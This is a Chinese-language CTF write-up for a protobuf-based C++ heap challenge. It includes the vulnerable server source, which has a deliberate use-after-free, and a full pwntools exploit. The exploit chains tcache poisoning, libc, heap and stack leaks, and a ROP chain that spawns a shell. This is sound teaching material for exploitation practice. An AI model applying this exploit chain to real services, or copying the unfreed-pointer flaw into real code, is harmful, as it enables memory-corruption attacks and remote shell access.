# Recode

## 题目简述

题目是一个使用 Protocol Buffers 做通信协议的 C++ 堆题。请求结构为 `OperationRequest`，包含操作码、`bytes op_operator`、目标索引和 `string target_value`；服务端维护 `Information` 数组，每项有 `operator_name`、`thing` 和 `capacity`，并用一个 `bins` 栈复用被删除的索引。

核心漏洞是 UAF：`ThrowThing` 释放 `operator_name` 和 `thing` 后没有清空指针，`ReadThing` 仍可读取旧索引。结合 tcache poisoning，可以泄露 libc 和 heap，再把 chunk 申请到 `info` 数组或目标地址附近，获得任意读写。最终通过 `environ` 泄露栈地址，在栈上写 ROP，劫持返回流程执行 `system("/bin/sh")`。

## 解题过程

### 源码

```
syntax = "proto3";
package robot;
message OperationRequest {
    uint32 op_num = 1;
    bytes op_operator = 2;
    int32 target_index = 3;
    string target_value = 4;
}
message OperationResponse {
    uint32 response_code = 1;
    string response_message = 2;
}
#include <cstring>
#include <iostream>
#include <fstream>
#include "robot/robot.pb.h"
#include <stack>
robot::OperationRequest request;
robot::OperationResponse response;
std::ofstream Log("./log", std::ios::out | std::ios::app);
struct Information {
    char* operator_name;
    char* thing;
    size_t capacity;
};
Information* info;
std::stack<int> bins;
unsigned int used_num;
void __attribute__((constructor)) init() {
    info = new Information[0x80];
}
void analyse() {
    std::string buffer;
    std::cin >> buffer;
    bool flags = request.ParseFromString(buffer);
    if (!flags) {
        Log << "In anaylyse: ";
        Log << "Failed to parse request" << std::endl;
        response.set_response_code(400);
        response.set_response_message("Can't parse requset");
        std::cout << response.SerializeAsString() << std::endl;
        exit(1);
    }
}
void CheckLink() {
    Log << "Checking link..." << std::endl;
    analyse();
    if (request.op_num() != 0xc0de && request.target_value() != "ping") {
        Log << "Link check failed: " << std::endl;
        Log << "Operation number: " << request.op_num() << std::endl;
        Log << "Target value: " << request.target_value() << std::endl;
        response.set_response_code(401);
        response.set_response_message("Can't establish a connection");
        exit(1);
    }
    Log << "Link check passed!" << std::endl;

    response.set_response_code(200);
    response.set_response_message("Server is healthy!");
    std::cout << response.SerializeAsString() << std::endl;
}
void WriteNewThing() {
    Log << "Writing" << std::endl;
    int idx;
    if (bins.empty()) {
        idx = used_num++;
        Log << "used_num =>" << used_num << std::endl;
    } else {
        idx = bins.top();
        bins.pop();
        Log << "bins.size =>" << bins.size() << std::endl;
    }

    info[idx].operator_name = static_cast<char*>
(malloc(request.op_operator().size()+0x10));
    strcpy(info[idx].operator_name, request.op_operator().c_str());
    info[idx].capacity = request.target_value().size();
    info[idx].thing = static_cast<char*>(malloc(info[idx].capacity+0x10));
    strcpy(info[idx].thing, request.target_value().c_str());

    Log << "Write finished!" << std::endl;
    response.set_response_code(201);
    response.set_response_message("Writing successfully!");
    std::cout << response.SerializeAsString() << std::endl;
}
void ReadThine() {
    Log << "Reading" << std::endl;
    int idx = request.target_index();
    if (idx>=used_num) {
        Log << "Index overflow" << std::endl;
        response.set_response_code(404);
        response.set_response_message("Index provided is too big");
        std::cout << response.SerializeAsString() << std::endl;
        return;
    }

    Log << "Read finished!" << std::endl;
    response.set_response_code(200);
    response.set_response_message(info[idx].thing);
    std::cout << response.SerializeAsString() << std::endl;
}
void EditThing() {
Log << "Editing" << std::endl;
    int idx = request.target_index();
    if (idx>=used_num || idx<0) {
        Log << "Index will overflow" << std::endl;
        response.set_response_code(404);
        response.set_response_message("Index provided is too big");
        std::cout << response.SerializeAsString() << std::endl;
        return;
    }

    if (info[idx].capacity < request.target_value().size() ||
strlen(info[idx].operator_name) < request.op_operator().size()) {
        Log << "Heap will overflow" << std::endl;
        response.set_response_code(400);
        response.set_response_message("request string is too long");
        std::cout << response.SerializeAsString() << std::endl;
        return;
    }

    strcpy(info[idx].operator_name, request.op_operator().c_str());
    strcpy(info[idx].thing, request.target_value().c_str());

    Log << "Edit finished!" << std::endl;
    response.set_response_code(200);
    response.set_response_message("Edit successfully");
    std::cout << response.SerializeAsString() << std::endl;
}
void ThrowThing() {
    Log << "Reading" << std::endl;
    int idx = request.target_index();
    if (idx>=used_num || idx<0) {
        Log << "Index overflow" << std::endl;
        response.set_response_code(404);
        response.set_response_message("Index provided is too big");
        std::cout << response.SerializeAsString() << std::endl;
        return;
    }

    bins.push(idx);
    free(info[idx].operator_name);
    free(info[idx].thing);

    Log << "Throw finished!" << std::endl;
    response.set_response_code(200);
    response.set_response_message("Throw successfully");
    std::cout << response.SerializeAsString() << std::endl;
}
int main() {
    CheckLink();
    for(;;) {
        analyse();
        switch(request.op_num()) {
            case 0xFFFF0001:
                WriteNewThing();
                break;
            case 0xFFFF0002:
                ReadThine();
                break;
            case 0xFFFF0003:
EditThing();
                break;
            case 0xFFFF0004:
                ThrowThing();
                break;
            default:
                response.set_response_code(405);
                response.set_response_message("Invalid operation");
                std::cout << response.SerializeAsString() << std::endl;
                break;
        }
    }
}
```

### 分析

简单逆向分析一下就能还原出 .proto ，找到 UAF 漏洞，还原 .proto 好像也能通过 pbtk 工具一把梭
简单利用 UAF，可以轻松泄露出 libc 地址和 heap 地址，注意到 op_operator 是 bytes 而 target_value 是
string，
先 add，然后 edit 打 tcache bin  ，将 chunk 申请到 chunk list ，然后任意地址读写。
值得一提的是，add 是通过 strlen 的返回值申请的，必然就不能直接申请，要先用垃圾数据 add 然后 edit，
strcpy 的末尾补零就可以用来利用覆盖垃圾数据，多次编辑就可以将大部分覆盖成零。

### EXP

Python 的 protobuf 版本是 3.20.3
robot_pb2 是通过 protoc 生成出来的

```
from pwn import *
import robot_pb2 as robot
context.binary = elf = ELF('./server')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
# io = remote("<host>", <port>)
libc = elf.libc
sc = '''
# brva 0x56A0
# brva 0x5686
# brva 0x5B9F
brva 0x553A
'''
io = process(elf.path)
def hello():
    hello = robot.OperationRequest()
    hello.op_num = 0xc0de
    hello.target_value = "ping"

    io.sendline(hello.SerializeToString())
def WriteThing(name: bytes, value: str):
    r = robot.OperationRequest()
    r.op_num = 0xFFFF0001
r.op_operator = name
    r.target_value = value
    io.sendline(r.SerializeToString())
def ReadThing(idx: int):
    r = robot.OperationRequest()
    r.op_num = 0xFFFF0002
    r.target_index = idx
    io.sendline(r.SerializeToString())
def EditThing(idx: int, name: bytes, value: str):
    r = robot.OperationRequest()
    r.op_num = 0xFFFF0003
    r.op_operator = name
    r.target_index = idx
    r.target_value = value
    io.sendline(r.SerializeToString())
def ThrowThing(idx: int):
    r = robot.OperationRequest()
    r.op_num = 0xFFFF0004
    r.target_index = idx
    io.sendline(r.SerializeToString())
response = robot.OperationResponse()
hello()
io.recvline()
WriteThing(b"test", "test"*0x200)
io.recvline()
WriteThing(b"test", "test")
io.recvline()
ThrowThing(0)
io.recvline()
ReadThing(0)
x = io.recvline()
y = io.recvline()
libc.address = u64(y[5:5+6].ljust(8, b"\x00")) - 0x21ace0
info("Libc base: " + hex(libc.address))
rdi = libc.address + 0x2a3e5
system = libc.sym.system
binsh = next(libc.search(b"/bin/sh"))
environ = libc.sym.environ
add_rsp_0x98 = libc.address + 0x29fce
WriteThing(b"test", "test"*0x200)
io.recvline()
WriteThing(b"test", "t"*0x50)  # 2
io.recvline()
WriteThing(b"test", "t"*0x50)  # 3
io.recvline()
WriteThing(b"test", "t"*0x50)  # 4
io.recvline()
ThrowThing(4)
io.recvline()
ThrowThing(3)
io.recvline()
ThrowThing(2)
io.recvline()
ReadThing(4)
x = io.recvline()
y = io.recvline()
heap = u64(y[5:5+5].ljust(8, b"\x00")) << 12
info("Heap base: " + hex(heap))
info_addr = heap + 0xcab0
payload = b'a'*0x10
payload += p64((heap >> 12)^(info_addr))[:6]
WriteThing(b'a'*0x50, 'test') # 2
io.recvline()
WriteThing(b'a'*0x50, 'test') # 3
io.recvline()
WriteThing(b'a'*0x50, 'test') # 4
io.recvline()
for idx in [4,3,2]:
    for i in range(0x20-1,0x16,-1):
        EditThing(idx, b'a'*i, 'test')
        io.recvline()
        sleep(0.1)
    EditThing(idx, payload, 'test')
ThrowThing(4)
io.recvline()
ThrowThing(3)
io.recvline()
ThrowThing(2)
io.recvline()
payload = p64((heap >> 12)^(heap + 0x990))[:6]
EditThing(2, payload, 'test')
io.recvline()
WriteThing(b'a'*0x10, 't'*0x10)  # 2
io.recvline()
WriteThing(b'a'*0x50, 't'*0x50)  # 3
io.recvline()
WriteThing(b'a'*0x50, 't'*0x30)  # 4
io.recvline()
WriteThing(b'X'*0x51, 'Y'*0x30)  # 5
io.recvline()
WriteThing(b'X'*0x100, 'Y'*0x180)  # 5
io.recvline()
for i in range(0x40, 0x40-2, -1):
    EditThing(5, b'X'*i, 'Y'*0x30)
    io.recvline()
    sleep(0.1)
EditThing(5, b'a'*(0x38+1) + p64(environ)[1:6], 'Y'*0x30)
io.recvline()
for i in range(0x38, 0x38-2, -1):
EditThing(5, b'X'*i, 'Y'*0x30)
    io.recvline()
    sleep(0.1)
# 0x980 是随便填的
EditThing(5, b'a'*0x30 + p64(heap+0x980)[:6], 'Y'*0x30)
io.recvline()
ReadThing(2)
z = io.recvuntil(b'. \n')
z = io.recvline()
stack = u64(z[5:5+6].ljust(8, b"\x00")) - 0xD8
info("Stack addr: " + hex(stack))
EditThing(5, b'a'*9 + p64(heap+0x980)[:6], 'Y'*0x30)
io.recvline()
rop_addr = stack + 8
EditThing(5, b'a'*8 + p64(heap+0x980)[:6], 'Y'*0x30)
io.recvline()
EditThing(5, b'a' + p64(rop_addr)[:6], 'Y'*0x30)
io.recvline()
EditThing(5, p64(rop_addr)[:6], 'Y'*0x30)
io.recvline()
EditThing(0, p64(rdi)[:6], 'Y'*0x30)
io.recvline()
EditThing(5, p64(rop_addr+8)[:6], 'Y'*0x30)
io.recvline()
EditThing(0, b'a'+p64(binsh)[:6], 'Y'*0x30)
io.recvline()
EditThing(0, p64(binsh)[:6], 'Y'*0x30)
io.recvline()
EditThing(5, p64(rop_addr+16)[:6], 'Y'*0x30)
io.recvline()
EditThing(0, b'a' + p64(system)[:6], 'Y'*0x30)
io.recvline()
# EditThing(0, p64(libc.address + 0x50902)[:6], 'Y'*0x30)
EditThing(0, p64(system+0x1B)[:6], 'Y'*0x30)
io.recvline()
# gdb.attach(io, gdbscript=sc)
key = stack - 0x98
EditThing(5, p64(key)[:6], 'Y'*0x30)
io.recvline()
EditThing(0, p64(add_rsp_0x98)[:6], 'Y'*0x30)
io.recvline()
io.interactive()
```

## 方法总结

遇到 protobuf 协议的 pwn 服务，先还原 `.proto`，再把每个操作码映射到增删改查语义。本题的关键是删除后索引仍可读写，能把 UAF 变成 tcache 链污染；随后利用 `bytes` 和 `string` 在长度、`\x00` 处理上的差异做部分覆盖。堆题利用链可以概括为：UAF 泄漏 libc/heap，tcache poisoning 建任意读写，`environ` 泄漏栈，栈上写 ROP。
